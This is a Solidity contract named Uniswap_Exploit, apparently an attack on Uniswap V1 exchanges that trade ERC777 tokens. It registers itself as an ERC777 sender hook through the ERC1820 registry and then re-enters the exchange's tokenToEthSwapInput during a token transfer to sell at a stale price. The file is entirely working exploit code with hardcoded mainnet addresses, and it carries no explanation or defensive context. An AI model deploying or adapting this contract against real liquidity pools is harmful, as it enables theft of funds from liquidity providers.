pragma solidity >=0.4.22 <0.7.0;


interface Uniswap_Factory {
    function getExchange(address token) external returns (address);
    function getToken(address token) external returns (address);
    function getTokenWithId(uint256 token_id) external returns (address);
}

interface Uniswap_Exchange {
    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external payable returns (uint256);
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}


interface IERC777Sender {
    function tokensToSend(
        address operator,
        address from,
        address to,
        uint amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}

interface IERC1820Registry {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

contract Uniswap_Exploit is IERC777Sender {

    bytes32 constant private TOKENS_SENDER_INTERFACE_HASH =
        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
    IERC1820Registry private _erc1820_registry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
        
    address payable private _owner;

    Uniswap_Factory uniswap_factory = Uniswap_Factory(0xc0a47dFe034B400B47bDaD5FecDa2621de6c4d95);
    uint256 approval = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    uint256 private token_left = 0;
    
    constructor() public {
        _owner = msg.sender;
        _erc1820_registry.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));
    }
    
    function execute(address token) external payable {
        require(msg.sender == _owner, "only admin");
        Uniswap_Exchange exchange = Uniswap_Exchange(uniswap_factory.getExchange(token));
        uint256 tokens_bought = exchange.ethToTokenSwapInput.value(msg.value)(1, approval);

        IERC20(token).approve(address(exchange), approval);
        
        uint256 send_token = tokens_bought / 2;
        token_left = tokens_bought - send_token;
        
        exchange.tokenToEthSwapInput(send_token, 1, approval);
        
    }
    
    fallback() external payable {
    }  
    
    function tokensToSend(address operator, address from, address to, uint amount, bytes calldata userData, bytes calldata operatorData) external override {
        if(address(from) == address(this) && token_left != 0){
            uint256 tmp = token_left;
            token_left = 0;
            Uniswap_Exchange(uniswap_factory.getExchange(operator)).tokenToEthSwapInput(tmp, 1, approval);
        } else {
            return;
        }
    }
    
    function withdrawal() external {
        _owner.transfer(address(this).balance);
    }
    
    function kill() external {
        require(msg.sender == _owner);
        selfdestruct(_owner);
    }
}